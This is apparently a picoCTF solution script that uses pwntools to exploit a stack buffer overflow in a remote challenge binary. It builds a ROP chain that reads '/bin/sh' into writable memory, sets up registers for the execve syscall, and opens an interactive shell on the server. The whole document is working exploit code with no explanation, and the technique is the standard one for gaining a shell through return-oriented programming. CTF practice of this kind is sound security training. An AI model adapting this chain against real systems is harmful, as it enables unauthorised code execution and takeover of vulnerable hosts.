from pwn import *

elf = context.binary = ELF('./vuln')

writable = 0x6bd000

offset = 120

p = remote('jupiter.challenges.picoctf.org', 28953)

p.sendlineafter('?\n', b'84')

rop = ROP(elf)

rop.raw(b'A' * offset)
rop.call(elf.sym.read, [0, writable, 0x200])

rop.raw(rop.find_gadget(['pop rax', 'ret'])[0])
rop.raw(59)
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(writable)
rop.raw(rop.find_gadget(['pop rsi', 'ret'])[0])
rop.raw(0)
# rop.raw(0x000000000045f997) # pop rdx ; pop rbx
# rop.raw(0)
rop.raw(rop.find_gadget(['pop rdx', 'ret'])[0])
rop.raw(0)
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

print(rop.dump())

p.sendlineafter('Name?', rop.chain())
p.sendline(b'/bin/sh\x00')

p.interactive()
